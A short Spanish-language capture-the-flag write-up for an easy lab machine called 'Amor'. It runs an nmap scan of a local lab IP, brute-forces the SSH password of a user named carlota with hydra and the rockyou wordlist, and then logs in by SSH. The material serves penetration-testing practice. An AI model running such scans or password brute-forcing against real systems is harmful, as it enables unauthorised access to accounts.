**Autor:** Romabri

**Dificultad:** Fácil

**Fecha de creación:** 26/04/2024

--------------------------------

DESPLIEGUE

```
bash auto_deploy.sh amor.tar
```


PROCEDIMIENTO:

Tenemos la IP: 
```
172.17.0.2
```

---------------------------

RECONOCIMIENTO

```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.17.0.2
```


![[Pasted image 20241013184156.png]]

Tenemos dos servicios abierto puerto 22 ssh y puerto 80 http. 

![[Pasted image 20241013184333.png]]

Abajo tenemos un nombre con posibilidad de que sea usuario del departamento de ciberseguridad. 

Por lo que podemos usar hydra para saber la contraseña de esa usuaria. 

```
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```


Y ahí tenemos la contraseña :

![[Pasted image 20241013184741.png]]

Ahora, entremos:

```
ssh carlota@172.17.0.2
```


![[Pasted image 20241013184912.png]]

